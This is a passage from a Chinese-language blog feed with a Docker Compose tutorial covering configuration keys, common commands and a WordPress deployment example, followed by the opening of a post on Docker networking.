class="string">&quot;3&quot;</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">web:</span></span><br><span class="line"><span class="attr">container_name:</span> <span class="string">docker-web-container</span></span><br></pre></td></tr></table></figure><p><strong>注意:</strong> 指定容器名称后，该服务将无法进行扩展（scale），因为 Docker 不允许多个容器具有相同的名称。</p><hr><h2 id="image"><a href="#image" class="headerlink" title="image"></a>image</h2><p>指定为镜像名称或镜像 ID。如果镜像在本地不存在，<code>Compose</code> 将会尝试拉取这个镜像。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">image:</span> <span class="string">ubuntu</span> <span class="comment">#REPOSITORY,不加版本号拉取最新版：latest</span></span><br><span class="line"><span class="attr">image:</span> <span class="string">mysql:5.7</span><span class="comment">#REPOSITORY:TAG</span></span><br><span class="line"><span class="attr">image:</span> <span class="string">a4bc65fd</span> <span class="comment">#digest, https://www.jianshu.com/p/62c6ea1a0975</span></span><br></pre></td></tr></table></figure><hr><h2 id="build"><a href="#build" class="headerlink" title="build"></a>build</h2><p>指定 <code>Dockerfile</code> 所在文件夹的路径（可以是绝对路径，或者相对 docker-compose.yml 文件的路径）。 <code>Compose</code> 将会利用它自动构建这个镜像，然后使用这个镜像。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&#x27;3&#x27;</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">webapp:</span></span><br><span class="line">    <span class="attr">build:</span> <span class="string">./dir</span></span><br></pre></td></tr></table></figure><p>你也可以使用 <code>context</code> 指令指定 <code>Dockerfile</code> 所在文件夹的路径。</p><p>使用 <code>dockerfile</code> 指令指定 <code>Dockerfile</code> 文件名。</p><p>使用 <code>arg</code> 指令指定构建镜像时的变量。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&#x27;3&#x27;</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">webapp:</span></span><br><span class="line">    <span class="attr">build:</span></span><br><span class="line">      <span class="attr">context:</span> <span class="string">./dir</span></span><br><span class="line">      <span class="attr">dockerfile:</span> <span class="string">Dockerfile-alternate</span></span><br><span class="line">      <span class="attr">args:</span></span><br><span class="line">        <span class="attr">buildno:</span> <span class="number">1</span></span><br></pre></td></tr></table></figure><hr><h2 id="ports"><a href="#ports" class="headerlink" title="ports"></a>ports</h2><p>暴露端口信息。使用宿主端口：容器端口 <code>(HOST:CONTAINER)</code> 格式，或者仅仅指定容器的端口（宿主将会随机选择端口）都可以。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">ports:</span></span><br><span class="line"> <span class="bullet">-</span> <span class="string">&quot;3000&quot;</span></span><br><span class="line"> <span class="bullet">-</span> <span class="string">&quot;8000:8000&quot;</span></span><br><span class="line"> <span class="bullet">-</span> <span class="string">&quot;49100:22&quot;</span></span><br><span class="line"> <span class="bullet">-</span> <span class="string">&quot;127.0.0.1:8001:8001&quot;</span></span><br></pre></td></tr></table></figure><p>注意：当使用 <code>HOST:CONTAINER</code> 格式来映射端口时，如果你使用的容器端口小于 60 并且没放到<strong>引号</strong>里，可能会得到错误结果，因为 <code>YAML</code> 会自动解析 <code>xx:yy</code> 这种数字格式为 60 进制。为避免出现这种问题，建议数字串都采用引号包括起来的字符串格式。</p><hr><h2 id="volumes"><a href="#volumes" class="headerlink" title="volumes"></a>volumes</h2><p><a href="https://nanzx.top/posts/f978/">数据卷</a>所挂载路径设置。可以设置为宿主机路径(<code>HOST:CONTAINER</code>)或者数据卷名称(<code>VOLUME:CONTAINER</code>)，并且可以设置访问模式 （<code>HOST:CONTAINER:ro</code>）。</p><p>该指令中路径支持相对路径。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">volumes:</span></span><br><span class="line"> <span class="bullet">-</span> <span class="string">/var/lib/mysql</span></span><br><span class="line"> <span class="bullet">-</span> <span class="string">cache/:/tmp/cache</span></span><br><span class="line"> <span class="bullet">-</span> <span class="string">~/configs:/etc/configs/:ro</span></span><br></pre></td></tr></table></figure><p>如果路径为数据卷名称，必须在文件中配置数据卷。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&quot;3&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">my_src:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">mysql:8.0</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">mysql_data:/var/lib/mysql</span></span><br><span class="line"></span><br><span class="line"><span class="attr">volumes:</span></span><br><span class="line">  <span class="attr">mysql_data:</span> <span class="comment">#compose会自动创建该卷名并在前面加上项目（所在文件夹）名为前缀，可通过docker volumes ls查看</span></span><br><span class="line">  <span class="attr">external:</span> <span class="comment">#可选</span></span><br><span class="line">  <span class="literal">true</span> <span class="comment">#true时，启动容器前需先通过`docker volume create 卷名`创建自定义数据卷</span></span><br></pre></td></tr></table></figure><hr><h2 id="networks"><a href="#networks" class="headerlink" title="networks"></a>networks</h2><p>配置容器连接的网络。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&quot;3&quot;</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">some-service:</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">     <span class="bullet">-</span> <span class="string">some-network</span></span><br><span class="line">     <span class="bullet">-</span> <span class="string">other-network</span></span><br><span class="line"></span><br><span class="line"><span class="attr">networks:</span></span><br><span class="line">  <span class="attr">some-network:</span></span><br><span class="line">  <span class="string">other-network</span></span><br><span class="line">  <span class="attr">external:</span> <span class="comment">#可选</span></span><br><span class="line">  <span class="literal">true</span> <span class="comment">#true时，使用外部指定网桥，必须存在</span></span><br></pre></td></tr></table></figure><hr><h2 id="environment"><a href="#environment" class="headerlink" title="environment"></a>environment</h2><p>设置环境变量，可以使用数组或字典两种格式。</p><p>只给定名称的变量会自动获取运行 Compose 主机上对应变量的值，可以用来防止泄露不必要的数据。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&quot;3&quot;</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">mysql:</span></span><br><span class="line">  <span class="attr">image:</span> <span class="string">mysql:5.7</span></span><br><span class="line"><span class="attr">environment:</span></span><br><span class="line"><span class="string">-MYSQL_ROOT_PASSWORD=123456</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##########################################</span></span><br><span class="line"></span><br><span class="line"><span class="attr">environment:</span></span><br><span class="line">  <span class="attr">RACK_ENV:</span> <span class="string">development</span></span><br><span class="line">  <span class="attr">SESSION_SECRET:</span></span><br><span class="line"><span class="comment">#等价于</span></span><br><span class="line"><span class="attr">environment:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">RACK_ENV=development</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">SESSION_SECRET</span></span><br></pre></td></tr></table></figure><p>如果变量名称或者值中用到 <code>true|false，yes|no</code> 等表达 <a href="https://yaml.org/type/bool.html">布尔</a> 含义的词汇，最好放到引号里，避免 YAML 自动解析某些内容为对应的布尔语义。这些特定词汇，包括：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">y|Y|<span class="built_in">yes</span>|Yes|YES|n|N|no|No|NO|<span class="literal">true</span>|True|TRUE|<span class="literal">false</span>|False|FALSE|on|On|ON|off|Off|OFF</span><br></pre></td></tr></table></figure><hr><h2 id="env-file"><a href="#env-file" class="headerlink" title="env_file"></a>env_file</h2><p>从文件中获取环境变量，可以为单独的文件路径或列表。</p><ul><li><p>如果通过 <code>docker-compose -f FILE</code> 方式来指定 Compose 模板文件，则 <code>env_file</code> 中变量的路径会基于模板文件路径。</p></li><li><p>如果有变量名称与 <code>environment</code> 指令冲突，则按照惯例，以后者为准。</p></li><li><p>文件需要以<code>.env</code>结尾。</p></li></ul><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&quot;3&quot;</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">mysql:</span></span><br><span class="line">  <span class="attr">image:</span> <span class="string">mysql:5.7</span></span><br><span class="line">    <span class="attr">env_file:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./msql.env</span></span><br><span class="line"></span><br><span class="line"><span class="comment">###############################################</span></span><br><span class="line"></span><br><span class="line"><span class="attr">env_file:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">./common.env</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">./apps/web.env</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">/opt/secrets.env</span></span><br></pre></td></tr></table></figure><p>环境变量文件中每一行必须符合格式，支持 <code>#</code> 开头的注释行。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># common.env: Set development environment</span></span><br><span class="line">MYSQL_ROOT_PASSWORD=123456</span><br></pre></td></tr></table></figure><hr><h2 id="command"><a href="#command" class="headerlink" title="command"></a>command</h2><p>覆盖容器启动后默认执行的命令。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&quot;3&quot;</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">redis:</span></span><br><span class="line">  <span class="attr">image:</span> <span class="string">redis:6.3</span></span><br><span class="line"><span class="attr">command:</span> <span class="string">&quot;redis-server --appendonly yes&quot;</span> <span class="comment">#默认启动命令redis-server</span></span><br></pre></td></tr></table></figure><hr><h2 id="depends-on"><a href="#depends-on" class="headerlink" title="depends_on"></a>depends_on</h2><p>表示服务之间的依赖关系。服务依赖会导致以下行为：</p><ul><li><code>docker-compose up</code>按依赖顺序启动服务。在下面的例子中，在 启动<code>web</code>之前先启动<code>db</code>和<code>redis</code>。</li><li><code>docker-compose up SERVICE</code>自动包含<code>SERVICE</code>的依赖项。在下面的示例中，<code>docker-compose up web</code>还创建并启动<code>db</code>和<code>redis</code>。</li><li><code>docker-compose stop</code>按依赖顺序停止服务。在以下示例中，<code>web</code>在<code>db</code>和<code>redis</code>之前停止。</li></ul><p>简单的例子：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&quot;3.9&quot;</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">web:</span></span><br><span class="line">    <span class="attr">build:</span> <span class="string">.</span></span><br><span class="line">    <span class="attr">depends_on:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">db</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">redis</span></span><br><span class="line">  <span class="attr">redis:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">redis</span></span><br><span class="line">  <span class="attr">db:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">postgres</span></span><br></pre></td></tr></table></figure><blockquote><p>注意：<code>web</code>不会等待<code>db</code>和<code>redis</code>「完全启动」之后才启动。</p></blockquote><hr><h2 id="healthcheck"><a href="#healthcheck" class="headerlink" title="healthcheck"></a>healthcheck</h2><p>通过命令检查容器是否健康运行。</p><p>有关如何进行健康检查的详细信息，请参阅<a href="https://docs.docker.com/engine/reference/builder/#healthcheck"> HEALTHCHECK Dockerfile </a>指令中的文档。</p><p>可通过<code>docker-compose ps</code>的state查看健康检查的状态</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">healthcheck:</span></span><br><span class="line">  <span class="attr">test:</span> [<span class="string">&quot;CMD&quot;</span>, <span class="string">&quot;curl&quot;</span>, <span class="string">&quot;-f&quot;</span>, <span class="string">&quot;http://localhost&quot;</span>]</span><br><span class="line">  <span class="attr">interval:</span> <span class="string">1m30s</span></span><br><span class="line">  <span class="attr">timeout:</span> <span class="string">10s</span></span><br><span class="line">  <span class="attr">retries:</span> <span class="number">3</span></span><br></pre></td></tr></table></figure><hr><h2 id="sysctls"><a href="#sysctls" class="headerlink" title="sysctls"></a>sysctls</h2><p>配置容器内核参数。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">sysctls:</span></span><br><span class="line">  <span class="attr">net.core.somaxconn:</span> <span class="number">1024</span></span><br><span class="line">  <span class="attr">net.ipv4.tcp_syncookies:</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="attr">sysctls:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">net.core.somaxconn=1024</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">net.ipv4.tcp_syncookies=0</span></span><br></pre></td></tr></table></figure><hr><h2 id="ulimits"><a href="#ulimits" class="headerlink" title="ulimits"></a>ulimits</h2><p>指定容器的 ulimits 限制值。</p><p>例如，指定最大进程数为 65535，指定文件句柄数为 20000（软限制，应用可以随时修改，不能超过硬限制） 和 40000（系统硬限制，只能 root 用户提高）。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">ulimits:</span></span><br><span class="line">  <span class="attr">nproc:</span> <span class="number">65535</span></span><br><span class="line">  <span class="attr">nofile:</span></span><br><span class="line">    <span class="attr">soft:</span> <span class="number">20000</span></span><br><span class="line">    <span class="attr">hard:</span> <span class="number">40000</span></span><br></pre></td></tr></table></figure><hr><h1 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h1><h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><p><strong>命令对象与格式：</strong></p><p>对于 Compose 来说，如果没有特别的说明，命令对象将是项目，这意味着项目中所有的服务都会受到命令影响。对象既可以是项目本身，<strong>也可以指定为项目中的服务或者容器</strong>，如：<code>docker-compose mysql up</code></p><p>执行 <code>docker-compose [COMMAND] --help</code> 或者 <code>docker-compose help [COMMAND]</code> 可以查看具体某个命令的使用格式。</p><p><code>docker-compose</code> 命令的基本的使用格式是</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose [-f=&lt;arg&gt;...] [options] [COMMAND] [ARGS...]</span><br></pre></td></tr></table></figure><p><strong>命令选项：</strong></p><ul><li><code>-f, --file FILE</code> 指定使用的 Compose 模板文件，默认为 <code>docker-compose.yml</code>，可以多次指定。</li><li><code>-p, --project-name NAME</code> 指定项目名称，默认将使用所在目录名称作为项目名。</li><li><code>--x-networking</code> 使用 Docker 的可拔插网络后端特性</li><li><code>--x-network-driver DRIVER</code> 指定网络后端的驱动，默认为 <code>bridge</code></li><li><code>--verbose</code> 输出更多调试信息。</li><li><code>-v, --version</code> 打印版本并退出。</li></ul><hr><h2 id="up"><a href="#up" class="headerlink" title="up"></a>up</h2><p>格式为 <code>docker-compose up [options] [SERVICE...]</code>。</p><ul><li><p>该命令十分强大，它将尝试自动完成包括构建镜像，（重新）创建服务，启动服务，并关联服务相关容器的一系列操作。</p></li><li><p>链接（依赖）的服务都将会被自动启动，除非已经处于运行状态。</p></li><li><p>可以说，大部分时候都可以直接通过该命令来启动一个项目。</p></li><li><p>默认情况，<code>docker-compose up</code> 启动的容器都在前台，控制台将会同时打印所有容器的输出信息，可以很方便进行调试。</p></li><li><p>当通过 <code>Ctrl-C</code> 停止命令时，所有容器将会停止。</p></li><li><p>如果使用 <code>docker-compose up -d</code>，将会在后台启动并运行所有的容器。一般推荐生产环境下使用该选项。</p></li><li><p>默认情况，如果服务容器已经存在，<code>docker-compose up</code> 将会尝试停止容器，然后重新创建（保持使用 <code>volumes-from</code> 挂载的卷），以保证新启动的服务匹配 <code>docker-compose.yml</code> 文件的最新内容</p></li></ul><hr><h2 id="down"><a href="#down" class="headerlink" title="down"></a>down</h2><ul><li><code>docker-compose down</code></li><li>此命令将会停止 <code>up</code> 命令所启动的容器，并移除网络（external的不会移除，自动创建的就会）</li></ul><hr><h2 id="exec"><a href="#exec" class="headerlink" title="exec"></a>exec</h2><ul><li><code>docker-compose exec 服务名</code></li><li>进入指定的容器，不能指定容器id。</li></ul><hr><h2 id="ps"><a href="#ps" class="headerlink" title="ps"></a>ps</h2><p>格式为 <code>docker-compose ps [options] [SERVICE...]</code>。</p><p>列出项目中目前的所有容器。</p><p>选项：</p><ul><li><code>-q</code> 只打印容器的 ID 信息。</li></ul><hr><h2 id="restart"><a href="#restart" class="headerlink" title="restart"></a>restart</h2><p>格式为 <code>docker-compose restart [options] [SERVICE...]</code>。</p><p>重启项目中的服务。</p><p>选项：</p><ul><li><code>-t, --timeout TIMEOUT</code> 指定重启前停止容器的超时（默认为 10 秒）。</li></ul><hr><h2 id="rm"><a href="#rm" class="headerlink" title="rm"></a>rm</h2><p>格式为 <code>docker-compose rm [options] [SERVICE...]</code>。</p><p>删除所有（停止状态的）服务容器。推荐先执行 <code>docker-compose stop</code> 命令来停止容器。</p><p>选项：</p><ul><li><code>-f, --force</code> 强制直接删除，包括非停止状态的容器。一般尽量不要使用该选项。</li><li><code>-v</code> 删除容器所挂载的数据卷。</li></ul><hr><h2 id="start"><a href="#start" class="headerlink" title="start"></a>start</h2><p>格式为 <code>docker-compose start [SERVICE...]</code>。</p><p>启动已经存在的服务容器。</p><hr><h2 id="stop"><a href="#stop" class="headerlink" title="stop"></a>stop</h2><p>格式为 <code>docker-compose stop [options] [SERVICE...]</code>。</p><p>停止已经处于运行状态的容器，但不删除它。通过 <code>docker-compose start</code> 可以再次启动这些容器。</p><p>选项：</p><ul><li><code>-t, --timeout TIMEOUT</code> 停止容器时候的超时（默认为 10 秒）。</li></ul><hr><h2 id="top"><a href="#top" class="headerlink" title="top"></a>top</h2><ul><li><code>docker-compose top</code></li><li>查看各个服务容器内运行的进程。</li></ul><hr><h2 id="unpause"><a href="#unpause" class="headerlink" title="unpause"></a>unpause</h2><ul><li><p><code>docker-compose unpause [SERVICE...]</code>。</p></li><li><p>恢复处于暂停状态中的服务。</p></li></ul><hr><h2 id="logs"><a href="#logs" class="headerlink" title="logs"></a>logs</h2><ul><li><p><code>docker-compose logs [SERVICE...]</code>。</p></li><li><p>不加服务名查看全部日志。</p></li></ul><hr><h1 id="一键部署WordPress博客"><a href="#一键部署WordPress博客" class="headerlink" title="一键部署WordPress博客"></a>一键部署WordPress博客</h1><ol><li><p>创建项目目录<code>mkdir my_wordpress</code>，进入目录<code>cd my_wordpress</code></p></li><li><p>创建一个<code>docker-compose.yml</code>文件来启动 <code>WordPress</code>博客和一个单独的<code>MySQL</code>实例，该实例具有用于数据持久性的卷挂载：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&quot;3.9&quot;</span></span><br><span class="line">    </span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">db:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">mysql:5.7</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">db_data:/var/lib/mysql</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="attr">MYSQL_ROOT_PASSWORD:</span> <span class="string">somewordpress</span></span><br><span class="line">      <span class="attr">MYSQL_DATABASE:</span> <span class="string">wordpress</span></span><br><span class="line">      <span class="attr">MYSQL_USER:</span> <span class="string">wordpress</span></span><br><span class="line">      <span class="attr">MYSQL_PASSWORD:</span> <span class="string">wordpress</span></span><br><span class="line">    </span><br><span class="line">  <span class="attr">wordpress:</span></span><br><span class="line">    <span class="attr">depends_on:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">db</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">wordpress:latest</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">wordpress_data:/var/www/html</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;8000:80&quot;</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="attr">WORDPRESS_DB_HOST:</span> <span class="string">db:3306</span></span><br><span class="line">      <span class="attr">WORDPRESS_DB_USER:</span> <span class="string">wordpress</span></span><br><span class="line">      <span class="attr">WORDPRESS_DB_PASSWORD:</span> <span class="string">wordpress</span></span><br><span class="line">      <span class="attr">WORDPRESS_DB_NAME:</span> <span class="string">wordpress</span></span><br><span class="line"><span class="attr">volumes:</span></span><br><span class="line">  <span class="attr">db_data:</span> &#123;&#125;</span><br><span class="line">  <span class="attr">wordpress_data:</span> &#123;&#125;</span><br></pre></td></tr></table></figure><p><strong>注意事项</strong>：WordPress Multisite 仅适用于端口<code>80</code>和<code>443</code></p></li><li><p>通过<code>docker-compose up -d</code>运行启动应用程序，-d 参数可以在后台启动</p></li><li><p>通过访问主机地址:8000就可以访问博客</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> Docker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Docker Compose </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker网络</title>
      <link href="/posts/59415/"/>
      <url>/posts/59415/</url>
      
        <content type="html"><![CDATA[<blockquote><p>参考视频：狂神说的Docker网络篇 <a href="https://www.bilibili.com/video/BV1og4y1q7M4?p=34">https://www.bilibili.com/video/BV1og4y1q7M4?p=34</a></p></blockquote><h1 id="理解docker0"><a href="#理解docker0" class="headerlink" title="理解docker0"></a>理解docker0</h1><p>通过<code>ip addr</code>命令可以查看linux上的网卡和IP地址等信息。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">[root@nanzx ~]# ip addr</span><br><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000</span><br><span class="line">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">    inet 127.0.0.1/8 scope host lo</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 ::1/128 scope host </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">2: ens33: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000</span><br><span class="line">    link/ether 00:0c:29:cf:b5:e0 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 192.168.2.110/24 brd 192.168.2.255 scope global noprefixroute ens33</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 fe80::8aa1:d94a:624c:6979/64 scope link noprefixroute </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">3: docker0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default </span><br><span class="line">    link/ether 02:42:e9:4d:1f:06 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 fe80::42:e9ff:fe4d:1f06/64 scope link </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br></pre></td></tr></table></figure><p>其中lo是回环接口，ens33是以太网接口，inet后为对应端口的IP地址。docker0则是docker启动时自动创建的网桥。</p><hr><p><strong>问题：docker是如何处理容器网络访问的？</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">测试 运行一个centos</span></span><br><span class="line">[root@nanzx ~]# docker run -it -d -p 8080:8080 --name centos01 centos</span><br><span class="line"></span><br><span class="line">[root@nanzx ~]#ip addr</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">多了以下的一个端口</span></span><br><span class="line">13: vethba9e0e5@if12: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue master docker0 state UP group default </span><br><span class="line">    link/ether 4e:4c:bc:fa:d9:d4 brd ff:ff:ff:ff:ff:ff link-netnsid 1</span><br><span class="line">    inet6 fe80::4c4c:bcff:fefa:d9d4/64 scope link </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[root@nanzx ~]# docker exec -it centos01 ip addr</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看容器内部网络地址 发现容器启动的时候会得到一个 eth0@if13 ip地址，是docker分配的</span></span><br><span class="line">12: eth0@if13: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default </span><br><span class="line">    link/ether 02:42:ac:11:00:03 brd ff:ff:ff:ff:ff:ff link-netnsid 0</span><br><span class="line">    inet 172.17.0.3/16 brd 172.17.255.255 scope global eth0</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta 